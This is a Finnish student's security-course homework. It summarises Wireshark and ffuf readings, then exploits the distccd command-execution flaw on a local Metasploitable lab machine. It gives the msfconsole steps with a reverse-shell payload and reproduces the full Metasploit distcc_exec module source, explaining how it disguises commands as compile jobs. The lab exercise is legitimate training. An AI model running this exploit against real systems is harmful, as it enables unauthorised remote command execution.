# h3 Nuuskija

## x) Lue ja tiivistä

Popov 2024: Hacktricks: Wireshark tricks [https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/wireshark-tricks#improve-your-wireshark-skills](https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/wireshark-tricks#improve-your-wireshark-skills)

- Analyysityökaluja: Expert Information näyttää analyysin pääkohdat; Protocol Hierarchy listaa kaikki protokollat
- Suodattimet: esim. http.request, näyttää HTTP-liikenteen
- CTRL+F hakee sisältöä

Karvinen 2023: Find Hidden Web Directories - Fuzz URLs with ffuf [https://terokarvinen.com/2023/fuzz-urls-find-hidden-directories/](https://terokarvinen.com/2023/fuzz-urls-find-hidden-directories/)
- FFUF (Fuzz Faster U Fool): nopea web-fuzzer, tunnistaa piilotettuja URL-osoitteita testaamalla automaattisesti useita URL-osoitteita -> vähemmän manuaalista työtä, enemmän tuloksia
-  FUFF käyttää sanakirjatiedostoja etsiäkseen piilotettuja URL-osoitteita tai hakemistoja
- Ohjeesta löytyy testattava kohde sekä suositus sanakirjatiedostolähteestä
- web-palvelin palauttaa HTTP-statuskoodin 200 OK kaikille URL-osoitteille, yhteisiä piirteitä ei-toivotuista vasteista voi etsiä ja suodattaa tuloksia niiden perusteella
- Suodattimia: vasteen koko (-fs), sanamäärä (-fw), rivit (-fl)
- Esim. curlilla voi tarkastaa tulokset

## a) Valitse valmis hyökkäys. Ota sellainen hyökkäys, jonka saat toimimaan omaan paikalliseen harjoitusmaaliin, kuten Metasploitableen. Demonstroi hyökkäyksen toiminta.

Googlasin hyökkäyksiä, ja löysin yhden, joka vaikutti helposti toteutettavalta sivulta [https://dev.to/atenadadkhah/hack-metasploitable-machine-in-5-ways-using-kali-linux-2h9e](https://dev.to/atenadadkhah/hack-metasploitable-machine-in-5-ways-using-kali-linux-2h9e): DISTCCD Open Port.

Avasin msfconsolen ``sudo msfconsole``, etsin hyökkäyksen ``search distccd`` ja valitsin hyökkäyksen ``use 0``. Asetin kohteeksi Metasploitablen ``set RHOSTS 192.168.56.102``.

![image](https://github.com/user-attachments/assets/c3426118-6cd5-48c9-9c7d-9bc6d98f5306)

``show payloads`` katsoin, millaisia payloadeja hyökkäyksessä pystyi käyttämään. Löytämäni ohjeen mukaan valitsin cmd/unix/reverse ``set PAYLOAD 6``, ja sitten ``run``.

Ilmoituksena tuli, että exploit suoritettu, sessiota ei luotu. Katsoin ``show options`` pitäisikö jotain muuta määrittää. Korjasin LHOST ``set LHOST 192.168.56.101``, valitsin saman payloadin ja suoritin exploitin uudelleen. Nyt pääsin sisään, mutten rootina. 

![image](https://github.com/user-attachments/assets/552fe8f1-b26f-4f6b-afc1-3bd457a3b2ca)

ps aux
dpkg -l |grep "udev"



## b) Sorsa. Selitä ja arvioi valitsemasi hyökkäyksen toimintaa lähdekoodista.

Lähdekoodin löysin ``/usr/share/metasploit-famework/modules/exploits/unix/misc/distcc_exec.rb``.

[https://www.computersecuritystudent.com/SECURITY_TOOLS/METASPLOITABLE/EXPLOIT/lesson2/index.html](https://www.computersecuritystudent.com/SECURITY_TOOLS/METASPLOITABLE/EXPLOIT/lesson2/index.html)

Exploitin kriittinen osa on dist_cmd-kohta, joka huijaa DistCC luulemaan, että komento on käännöskomento. Tässä vaiheessa payload suoritetaan etäkoneella.



```ruby

# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'DistCC Daemon Command Execution',
      'Description'    => %q{
        This module uses a documented security weakness to execute
        arbitrary commands on any system running distccd.

      },
      'Author'         => [ 'hdm' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2004-2687'],
          [ 'OSVDB', '13378' ],
          [ 'URL', 'http://distcc.samba.org/security.html'],

        ],
      'Platform'       => ['unix'],
      'Arch'           => ARCH_CMD,
      'Privileged'     => false,
      'Payload'        =>
        {
          'Space'       => 1024,
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType' => 'cmd cmd_bash',
              'RequiredCmd' => 'generic perl ruby bash telnet openssl bash-tcp',
            }
        },
      'Targets'        =>
        [
          [ 'Automatic Target', { }]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => '2002-02-01'
      ))

      register_options(
        [
          Opt::RPORT(3632)
        ])
  end

  def check
    r = rand_text_alphanumeric(10)
    connect
    sock.put(dist_cmd("sh", "-c", "echo #{r}"))

    dtag = rand_text_alphanumeric(10)
    sock.put("DOTI0000000A#{dtag}\n")

    err, out = read_output
    if out && out.index(r)
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe
  end

  def exploit
    connect

    distcmd = dist_cmd("sh", "-c", payload.encoded);
    sock.put(distcmd)

    dtag = rand_text_alphanumeric(10)
    sock.put("DOTI0000000A#{dtag}\n")

    err, out = read_output

    (err || "").split("\n") do |line|
      print_status("stderr: #{line}")
    end
    (out || "").split("\n") do |line|
      print_status("stdout: #{line}")
    end

    handler
    disconnect
  end

  def read_output

    res = sock.get_once(24, 5)

    if !(res and res.length == 24)
      print_status("The remote distccd did not reply to our request")
      disconnect
      return
    end

    # Check STDERR
    res = sock.get_once(4, 5)
    res = sock.get_once(8, 5)
    len = [res].pack("H*").unpack("N")[0]

    return [nil, nil] if not len
    if (len > 0)
      err = sock.get_once(len, 5)
    end

    # Check STDOUT
    res = sock.get_once(4, 5)
    res = sock.get_once(8, 5)
    len = [res].pack("H*").unpack("N")[0]

    return [err, nil] if not len
    if (len > 0)
      out = sock.get_once(len, 5)
    end
    return [err, out]

  end


  # Generate a distccd command
  def dist_cmd(*args)

    # Convince distccd that this is a compile
    args.concat(%w{# -c main.c -o main.o})

    # Set distcc 'magic fairy dust' and argument count
    res = "DIST00000001" + sprintf("ARGC%.8x", args.length)

    # Set the command arguments
    args.each do |arg|
      res << sprintf("ARGV%.8x%s", arg.length, arg)
    end

    return res
  end
end
```



## c) Snif snif. Selitä ja arvioi valitsemasi hyökkäyksen toimintaa verkkosnifferillä. Pohdi myös, miten näkyvä tämä hyökkäys tai kontrollikanava on verkossa. (Vapaaehtoinen bonus: liitä mukaan pcap tekemästäsi nauhoituksesta).


## d) Fuzzzz. Ratkaise dirfuz-1 artikkelista Karvinen 2023: Find Hidden Web Directories - Fuzz URLs with ffuf.


## d) HTB. Ratkaise 1-2 konetta HackTheBoxisssa. Voit valita omaan taitotasoon sopivat koneet.


## e) Vapaaehtoinen, helppo: Vaihda 'micro' Metasploitin oletuseditoriksi. Sille on oma 'setg' asetus.


## Lähteet

https://www.computersecuritystudent.com/SECURITY_TOOLS/METASPLOITABLE/EXPLOIT/lesson2/index.html

https://dev.to/atenadadkhah/hack-metasploitable-machine-in-5-ways-using-kali-linux-2h9e


https://dev.to/atenadadkhah/hack-metasploitable-machine-in-5-ways-using-kali-linux-2h9e
